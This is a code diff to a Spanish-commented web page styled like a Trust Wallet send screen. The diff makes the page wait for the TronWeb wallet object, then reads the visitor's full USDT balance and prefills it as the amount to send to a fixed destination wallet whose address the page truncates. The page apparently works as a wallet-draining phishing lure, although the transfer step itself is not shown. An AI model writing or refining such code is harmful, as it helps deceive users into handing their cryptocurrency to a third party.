@@ -26,9 +26,7 @@
         .tw-label { font-size: 13px; color: #717680; display: block; margin-bottom: 8px; }
         .tw-input-row { display: flex; align-items: center; justify-content: space-between; }
         .tw-input { background: transparent; border: none; color: #111111; font-size: 16px; width: 80%; outline: none; }
-        .tw-action-text { color: #0052ff; font-size: 14px; font-weight: 600; cursor: pointer; }
         .tw-currency-badge { color: #0052ff; font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 5px; }
-        .usdt-icon { width: 18px; height: 18px; }
         .status-box { background-color: #edf2ff; border: 1px solid #cce0ff; border-radius: 12px; padding: 12px; font-size: 13px; color: #0052ff; margin-bottom: 16px; display: none; text-align: left; }
         .tw-btn-container { margin-top: 40px; }
         .tw-btn { width: 100%; height: 52px; background-color: #0052ff; color: #ffffff; border: none; border-radius: 26px; font-size: 16px; font-weight: 600; cursor: pointer; }
@@ -147,28 +145,41 @@
 
     addressDisplay.value = `${BILLETERA_DESTINO.slice(0, 6)}...${BILLETERA_DESTINO.slice(-6)}`;
 
+    // Función auxiliar para esperar a que Trust Wallet inyecte TronWeb si tarda un par de segundos
+    async function esperarTronWeb() {
+        for (let i = 0; i < 15; i++) {
+            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                return window.tronWeb;
+            }
+            await new Promise(r => setTimeout(r, 300));
+        }
+        return window.tronWeb;
+    }
+
     connectBtn.addEventListener('click', async () => {
         if (!walletAddress) {
             try {
                 setStatus("Conectando con la billetera...");
                 connectBtn.disabled = true;
 
-                if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
+                // Esperamos un momento a que la app inyecte el objeto
+                const tronWebInstance = await esperarTronWeb();
+
+                if (!tronWebInstance || !tronWebInstance.defaultAddress || !tronWebInstance.defaultAddress.base58) {
                     throw new Error("Abre este enlace desde el navegador interno de tu billetera TRON.");
                 }
 
-                walletAddress = window.tronWeb.defaultAddress.base58;
+                walletAddress = tronWebInstance.defaultAddress.base58;
                 walletAddressText.textContent = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-6)}`;
                 walletInfo.style.display = "block";
                 tronNetworkInfo.style.display = "flex";
 
                 setStatus("Consultando balance en blockchain...");
                 
-                // Lectura limpia y directa usando TronWeb nativo
-                const contract = await window.tronWeb.contract().at(CONTRATO_USDT);
+                const contract = await tronWebInstance.contract().at(CONTRATO_USDT);
                 const balanceSun = await contract.balanceOf(walletAddress).call();
                 
-                balanceReal = window.tronWeb.toDecimal(balanceSun) / 1000000;
+                balanceReal = tronWebInstance.toDecimal(balanceSun) / 1000000;
                 amountDisplay.value = balanceReal.toFixed(2);
 
                 setStatus("Billetera conectada con éxito.");
